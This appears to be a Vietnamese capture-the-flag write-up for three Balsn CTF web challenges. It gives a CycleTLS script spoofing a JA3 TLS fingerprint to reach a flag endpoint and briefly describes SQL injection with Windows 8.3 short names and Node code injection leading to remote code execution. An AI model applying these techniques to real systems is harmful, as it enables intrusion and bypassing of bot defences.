# 0FA
Ứng dụng dùng TLS/JA3 fingerprints, mình đã search tool để spoof nó (https://github.com/Danny-Dasilva/CycleTLS).

```js
const initCycleTLS = require('cycletls');
// Typescript: import initCycleTLS from 'cycletls';

(async () => {
  // Initiate CycleTLS
  const cycleTLS = await initCycleTLS();

  // Send request
  const response = await cycleTLS('https://0fa.balsnctf.com:8787/flag.php', {
    body: 'username=admin',
    ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
  }, 'POST');

  console.log(response);

  // Cleanly exit CycleTLS
  cycleTLS.exit();

})();

```

# ginowa
SQL injection ở /index.php?id=, dùng nó để đọc file read flag bằng shortname C:/readfl~1.exe, sau khi reverse nó thì thấy nó đọc file s. Lại tiếp tục dùng SQL injection để lấy file s rồi reverse tiếp là có flag.

Trick: name 8.3 trên Windows.

# saas
Ở endpoint /register nhận user input làm đầu vào của validatorFactory -> inject được node code.
![image](https://github.com/lemauanhphong/ctf_writeups/assets/91038460/6fc8c6ea-6c67-4309-a49e-153a14bee52c)

Sau khi inject được thì trigger ở endpoint /whowilldothis/:uid để RCE
![image](https://github.com/lemauanhphong/ctf_writeups/assets/91038460/86389be2-a115-4662-8c1e-67ac07813a0e)


